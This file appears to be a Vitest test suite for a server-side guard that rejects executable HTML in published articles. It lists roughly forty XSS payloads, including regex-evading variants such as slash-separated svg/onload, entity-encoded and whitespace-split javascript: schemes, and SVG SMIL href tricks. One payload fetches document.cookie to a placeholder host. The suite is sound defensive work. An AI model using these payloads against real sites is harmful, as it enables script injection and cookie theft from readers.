/**
 * tests/inert-guard.test.ts — the server-side publish backstop (lib/inert-guard.js).
 *
 * WHAT THIS FILE IS
 * -----------------
 * A Vitest suite that pins the fail-closed inert-guard: the check /api/author/publish runs
 * on the browser-rendered body_html before it is committed live to the DB. It exists so a
 * hand-crafted POST that BYPASSES the editor's in-pipeline sanitize cannot ship an
 * executable construct to the reader — and, just as importantly, so a future refactor of the
 * guard cannot silently start rejecting the LEGITIMATE output of the render pipeline (the D2
 * SVG, the inert Plotly `<script type="application/json">` island, KaTeX/MathML, Shiki spans).
 *
 * WHY THIS MATTERS (SECURITY CONTEXT)
 * -----------------------------------
 * The reader's /@handle/slug page is edge-assembled and inherits the site CSP, which keeps
 * `script-src 'unsafe-inline'` (the static site ships first-party inline scripts and cannot
 * nonce per request). So an inline <script> or on* handler that slips past this guard WOULD
 * execute in the reader's browser. The guard is therefore the real barrier, not a nicety —
 * and it must match the BROWSER'S parse exactly, which is why it walks a parse5 tree rather
 * than scanning the string (a regex scan is defeated by `<svg/onload=…>` slash-separated
 * attributes and `href="java&#115;cript:…"` entity-encoded schemes, both covered below).
 *
 * These are pure, in-memory assertions (no build, no network) — the parser is the only dep.
 */
import { describe, it, expect } from 'vitest';
import { assertInert, InertError } from '../lib/inert-guard.js';

// Payloads that a bypass-the-editor POST might carry. Every one must be REJECTED.
const MALICIOUS: Array<[string, string]> = [
  ['bare <script>', '<script>alert(1)</script>'],
  ['typed js <script>', '<script type="text/javascript">alert(1)</script>'],
  ['uppercase <SCRIPT>', '<SCRIPT>alert(1)</SCRIPT>'],
  ['<script> module', '<script type="module">import("//e")</script>'],
  ['<script> empty type', '<script type="">alert(1)</script>'],
  ['img onerror (spaced)', '<img src=x onerror=alert(1)>'],
  ['svg/onload (slash-separated — defeats a regex)', '<svg/onload=alert(1)></svg>'],
  ['svg onload', '<svg onload=alert(1)></svg>'],
  ['div onclick (quoted)', '<div onclick="steal()">x</div>'],
  ['uppercase ONLOAD attr', '<div ONLOAD=x>y</div>'],
  ['a href javascript:', '<a href="javascript:alert(1)">x</a>'],
  ['a href entity-encoded scheme (defeats a regex)', '<a href="java&#115;cript:alert(1)">x</a>'],
  ['a href leading whitespace', '<a href="   javascript:alert(1)">x</a>'],
  ['a href tab-split scheme', '<a href="java\tscript:alert(1)">x</a>'],
  ['a href newline-split scheme', '<a href="java\nscript:alert(1)">x</a>'],
  ['a href vbscript:', '<a href="vbscript:msgbox(1)">x</a>'],
  ['a href data:text/html', '<a href="data:text/html,<script>alert(1)</script>">x</a>'],
  ['svg <a xlink:href> js', '<svg><a xlink:href="javascript:alert(1)"><text>x</text></a></svg>'],
  ['svg <use xlink:href> js', '<svg><use xlink:href="javascript:alert(1)"/></svg>'],
  ['iframe', '<iframe src="//evil"></iframe>'],
  ['object', '<object data="evil.swf"></object>'],
  ['embed', '<embed src="evil">'],
  ['form + input', '<form action="//evil"><input name="p"></form>'],
  ['base', '<base href="//evil/">'],
  ['meta refresh', '<meta http-equiv="refresh" content="0;url=//evil">'],
  ['link rel=import', '<link rel="import" href="evil.html">'],
  ['<template> laundering', '<template><script>alert(1)</script></template>'],
  ['<noscript> handler', '<noscript><img src=x onerror=alert(1)></noscript>'],
  ['onclick nested in foreignObject', '<svg><foreignObject><div onclick="x">hi</div></foreignObject></svg>'],
  ['svg <set> SMIL href retarget', '<svg><set attributeName="href" to="javascript:alert(1)"/></svg>'],
  ['svg <animate> SMIL href', '<svg><animate attributeName="href" values="javascript:alert(1)"/></svg>'],
  ['div onmouseover', '<div style="x" onmouseover=alert(1)>y</div>'],
  ['legit body then injected <script>', '<p>Real intro.</p><h2>Head</h2><script>fetch("//e?"+document.cookie)</script>'],
  ['marquee onstart', '<marquee onstart=alert(1)>x</marquee>'],
  ['a href data:image/svg+xml navigation', '<a href="data:image/svg+xml,<svg onload=alert(1)>">x</a>'],
  ['img src data:text/html', '<img src="data:text/html,evil">'],
  ['unclosed <script>', '<p>hi</p><script>alert(1)'],
  ['unknown wrapper + <script>', '<xss-widget><script>alert(1)</script></xss-widget>'],
  ['portal', '<portal src="//evil"></portal>'],
];

// The real render pipeline's output — and honest edge cases. Every one must be ALLOWED.
const SAFE: Array<[string, string]> = [
  ['Plotly application/json island', '<div class="plotly-cell"><div class="plot"></div><script type="application/json">{"data":[{"x":[1,2,3],"y":[4,5,6]}],"layout":{}}</script></div>'],
  ['D2 SVG (style, use #frag, xlink:href #frag)', '<figure class="diagram"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 100"><defs><marker id="ar"><path d="M0 0"/></marker></defs><style>.s{fill:#111}</style><g><rect class="s" x="1" y="1" width="40" height="20"/><text x="4" y="14">Node</text></g><use xlink:href="#ar"/><use href="#ar"/></svg></figure>'],
  ['KaTeX HTML', '<span class="katex"><span class="katex-html"><span class="base"><span class="mord mathnormal">x</span><span class="mrel">=</span><span class="mord">1</span></span></span></span>'],
  ['KaTeX MathML', '<math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi><mo>=</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">x=1</annotation></semantics></math>'],
  ['Shiki code block', '<pre class="astro-code" style="background:#0d1117"><code><span class="line"><span style="color:#FF7B72">const</span><span style="color:#C9D1D9"> x = </span><span style="color:#79C0FF">1</span></span></code></pre>'],
  ['normal essay markup', '<h1>Title</h1><p>Body with <a href="https://example.com/page">a link</a>, an <em>emphasis</em>, and <strong>bold</strong>.</p><blockquote><p>Quote.</p></blockquote><ul><li>one</li></ul><img src="/img/diagram.png" alt="d">'],
  ['fragment/mailto/tel/protocol-relative links', '<p><a href="#sec">jump</a> <a href="mailto:x@y.com">mail</a> <a href="tel:+15551234">call</a> <a href="//cdn.example.com/a">cdn</a></p>'],
  ['inline PNG data URI image', '<p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAC0lEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==" alt="dot"></p>'],
  ['foreignObject benign label', '<svg><foreignObject width="80" height="20"><div xmlns="http://www.w3.org/1999/xhtml">Label</div></foreignObject></svg>'],
  ['escaped <script> inside a code sample', '<pre><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></pre>'],
  ['prose that mentions the javascript scheme', '<p>Avoid the <code>javascript:</code> URL scheme in production.</p>'],
  ['prose that mentions onclick', '<p>The <code>onclick</code> handler fires on click.</p>'],
  ['svg <use> fragment reference only', '<svg><use href="#arrowhead"/></svg>'],
  ['empty body', ''],
  // frameset/frame are invalid in flow content and are DROPPED to nothing by parse5 AND the
  // browser where author HTML lands — there is nothing executable left to reject.
  ['frameset neutralized by the parser', '<p>ok</p><frameset><frame src="//evil"></frameset>'],
];

describe('inert-guard: rejects executable constructs (bypass-the-editor POST)', () => {
  for (const [name, html] of MALICIOUS) {
    it(`rejects ${name}`, () => {
      expect(() => assertInert(html)).toThrow(InertError);
    });
  }
});

describe('inert-guard: allows the render pipeline output (no false positives)', () => {
  for (const [name, html] of SAFE) {
    it(`allows ${name}`, () => {
      expect(assertInert(html)).toBe(true);
    });
  }
});
